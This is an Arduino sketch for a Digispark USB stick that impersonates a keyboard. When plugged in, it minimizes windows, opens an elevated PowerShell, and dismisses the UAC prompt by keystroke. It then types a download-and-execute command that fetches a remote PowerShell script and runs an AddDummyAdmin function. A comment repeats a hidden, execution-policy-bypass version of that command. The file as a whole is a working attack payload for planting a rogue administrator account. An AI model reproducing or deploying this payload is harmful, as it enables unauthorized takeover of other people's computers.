
#include "DigiKeyboardDe.h"

#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F

void setup() 
{
  pinMode(1, OUTPUT); //LED on Model A 

  //Digispark Tastatur einmalige ausgabe:
  DigiKeyboardDe.update();
  DigiKeyboardDe.delay(200);
  DigiKeyboardDe.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimize all windows
  DigiKeyboardDe.delay(200);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboardDe.delay(200);
  
  //Run cmd as admin:
  DigiKeyboardDe.println("powershell.exe Start-Process powershell.exe -Verb runAs");
  //DigiKeyboardDe.print("powershell.exe");
  //DigiKeyboardDe.sendKeyStroke(DE_MOD_CONTROL_LEFT, DE_MOD_SHIFT_LEFT);
  //DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  //DigiKeyboardDe.sendKeyStroke(KEY_J, DE_MOD_ALT_LEFT);
  DigiKeyboardDe.delay(2000);
  DigiKeyboardDe.sendKeyStroke(KEY_LEFT_ARROW); 
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER); 
  DigiKeyboardDe.delay(500);  
  DigiKeyboardDe.println("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fugitivus/deftooth/master/deftooth.ps1');AddDummyAdmin");
}

void loop() 
{ 
  //LED blinken wenn fertig...powershell.exe -NoP -sta -W Hidden -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fugitivus/deftooth/master/deftooth.ps1');AddDummyAdmin"
  
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(200);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(200);
}
